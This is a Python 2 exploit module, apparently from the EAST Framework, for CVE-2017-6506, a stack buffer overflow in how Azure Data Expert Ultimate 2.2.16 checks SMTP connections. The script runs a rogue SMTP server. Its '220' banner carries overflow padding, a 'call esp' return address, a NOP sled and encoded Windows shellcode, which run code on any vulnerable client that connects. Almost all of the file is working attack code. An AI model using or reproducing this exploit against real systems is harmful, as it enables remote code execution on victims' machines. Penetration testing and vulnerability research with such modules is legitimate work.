#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_azure_data_expert_ulimate_bof_rce"
INFO['DESCRIPTION'] = "Azure Data Expert Ultimate 2.2.16 - Buffer Overflow"
INFO['VENDOR'] = "http://www.azuredex.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41545/']
INFO["CVE Name"] = 'CVE-2017-6506'
INFO["NOTES"] = """
This module exploits a stack buffer overflow in SMTP connection verification function leads to code execution
"""

INFO['CHANGELOG'] = "09 Mar, 2017. Written by East team"
INFO['PATH'] = 'Exploits/General/'

OPTIONS = OrderedDict()
OPTIONS['PORT'] = 25, dict(description = 'Server port')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        #self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32        
        badchars = ["\x00", "\x0a", "\x0d", "\x26"]
        shellcode_type = "command"
        
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, '', 0, badchars)
        shellcode = s.create_shellcode(shellcode_type, encode=ShellUtils.Constants.EncoderType.JUMPCALL_XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def run(self):
        self.args()
        self.log('Attacking {}'.format(self.host))
            
        shellcode = self.make_sploit()
        if not shellcode:
            self.log('Shellcode not generated')
            self.finish(False)
        
        packet = 'A' * 176 + 'A' * 76
        packet += "\x5e\x63\x27\x65" #call esp
        packet += 'B' * 12
        packet += '\x90' * 8
        packet += shellcode
        
        self.log('Start server at {} port. Wait connection'.format(self.port))
        s = socket.socket()
        s.bind(('0.0.0.0', self.port))            
        s.listen(1) 
        
        conn, addr = s.accept()     
        conn.send('220 ' + packet + '\r\n')
        conn.close()
        
        self.log('Payload sent')
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()